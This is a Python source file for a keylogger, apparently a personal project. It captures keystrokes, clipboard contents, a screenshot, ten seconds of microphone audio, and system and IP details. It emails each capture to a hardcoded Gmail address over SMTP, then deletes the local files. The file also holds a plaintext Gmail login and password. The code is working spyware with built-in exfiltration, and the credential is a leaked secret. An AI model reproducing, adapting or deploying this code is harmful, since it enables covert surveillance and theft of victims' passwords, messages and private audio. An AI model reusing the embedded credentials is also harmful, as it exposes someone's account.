import email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from os import name
import smtplib
from multiprocessing import Process,freeze_support
from PIL import ImageGrab
import time

import socket
import platform

import pyperclip

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

import socket
import platform

import sounddevice as sd

fromaddr = "tekops18bce@gmail.com"
password = "anurag@project"
toaddr = "eznizer@gmail.com"

def send_email(filename,attatchment,toaddr,subject):
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = subject

    body = subject
    msg.attach(MIMEText(body,'plain'))

    attatchment = open(attatchment,'rb')

    P = MIMEBase('application','octet-stream')
    P.set_payload((attatchment).read())
    encoders.encode_base64(P)

    P.add_header('Content-Disposition','attatchment : filename = %s ' % filename)
    msg.attach(P)

    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,password)
    text = msg.as_string()
    s.sendmail(fromaddr,toaddr,text)
    s.quit()

path = 'E:\\PROJECTS\\keylogger\\src\\log'
extend ='\\'
key_info = 'keylog.txt'
sys_info = 'system.txt'
clip_info = 'clipboard.txt'
screenshot = 'screenshot.png'
audio_information = "audio.wav"
count = 0
keys = []
files_t = [key_info,sys_info,clip_info,screenshot,audio_information]
def on_press(key):
    global keys,count
    keys.append(key)
    count +=1

    if(count>=1):
        count=0
        write_file(keys)
        keys=[]

def write_file(keys):
    with open(path+extend+key_info,'a') as f:
        for key in keys:
            k = str(key).replace("'","")
            if(k.find("space")>0):
                f.write('\n')
                f.close()
            elif k.find("Key")==-1:
                f.write(k)
                f.close()

def on_release(key):
    if(key==Key.esc):
        return False

def system_information():
    with open(path+extend+sys_info,"a") as f:
        hostname = socket.gethostname()
        IP_ADD = socket.gethostbyname(hostname)

        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IP_ADD + "\n")

def clipboard_information():
    with open(path + extend + clip_info, "a") as f:
        pasted_data = pyperclip.paste()
        f.write("Clipboard Data: \n" + pasted_data)
        f.close()

def screenshot_information():
    im = ImageGrab.grab()
    im.save(path+extend+screenshot)

def audio_info():
    fs = 44100
    seconds = 10

    rec = sd.rec(seconds*fs,samplerate=fs,channels=2)
    sd.wait()
    write(path+extend+audio_information,fs,rec)

def delete_files():
    for file in files_t:
        os.remove(path+extend+file)

if __name__ == "__main__":
    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()
        system_information()
        clipboard_information()
        screenshot_information()
        audio_info()
        send_email(key_info,path+extend+key_info,toaddr,"Key Information")
        send_email(sys_info,path+extend+sys_info,toaddr,"System Information")
        send_email(clip_info,path+extend+clip_info,toaddr,"Clipboard Information")
        send_email(screenshot,path+extend+screenshot,toaddr,"Screenshot")
        send_email(audio_information,path+extend+audio_information,toaddr,"Audio Information")
        delete_files()
